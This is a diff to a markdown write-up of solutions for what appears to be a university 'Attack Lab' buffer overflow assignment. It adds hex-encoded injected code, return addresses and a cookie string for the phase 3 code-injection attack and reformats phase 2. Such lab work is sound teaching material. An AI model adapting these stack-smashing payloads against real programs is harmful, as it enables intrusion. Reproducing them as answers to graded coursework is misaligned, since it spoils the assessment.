@@ -17,14 +17,29 @@ See guide at https://github.com/magna25/Attack-Lab/.
 ```
 // injected code with total 40 bytes
 48 c7 c7 1f 25 3c 37 c3
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
 // address of register and touch2
 18 22 65 55 00 00 00 00
 a0 16 40 00 00 00 00 00 
 ```
 
 ## Phase 3 Solution
+```
+// injected code with total 40 bytes
+48 c7 c7 50 17 68 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+// address of register and touch3
+18 22 65 55 00 00 00 00
+a0 16 40 00 00 00 00 00
+// cookie
+33 37 33 63 32 35 31 66
+```
 
 ## Phase 4 Solution
 
